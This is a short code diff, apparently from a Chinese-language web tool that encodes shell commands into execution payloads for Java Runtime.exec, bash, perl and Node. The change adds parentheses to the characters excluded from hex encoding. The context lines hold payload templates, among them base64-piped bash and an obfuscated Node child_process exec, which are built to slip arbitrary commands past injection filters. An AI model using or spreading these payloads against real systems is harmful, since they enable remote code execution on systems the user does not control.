@@ -33,7 +33,7 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 /bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
 
 
-🔥实际payload 【成功率低】 如果命令字符串 包含了 shell下的特殊字符 < > { } | & ; 则命令可能执行失败.
+🔥实际payload 【成功率低】 如果命令字符串 包含了 shell下的特殊字符 ( ) < > { } | & ; 则命令可能执行失败.
 /bin/bash -c $@|bash 0 arr0w1_cmd_origin
 /bin/bash -c $*|bash 0 arr0w1_cmd_origin
 </textarea>
@@ -52,7 +52,7 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
 
 5⃣️ hex编码
 支持Linux/macOS
-如果命令字符串 包含了 shell下的特殊字符 < > { } | & ; 自动不对它们做hex编码, 使命令执行成功.
+如果命令字符串 包含了 shell下的特殊字符 ( ) < > { } | & ; 自动不对它们做hex编码, 使命令执行成功.
 🔥实际payload
 `echo -e "ascii_2_Hex_without_black_chars_flag"`
 </textarea>
@@ -209,7 +209,7 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
     }
 
     function ascii_2_Hex_without_black_chars(str) {
-        var regex_black_chars = /([<>{}|&;])/g;
+        var regex_black_chars = /([()<>{}|&;])/g;
         var str_array = str.split(regex_black_chars);
         // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
 
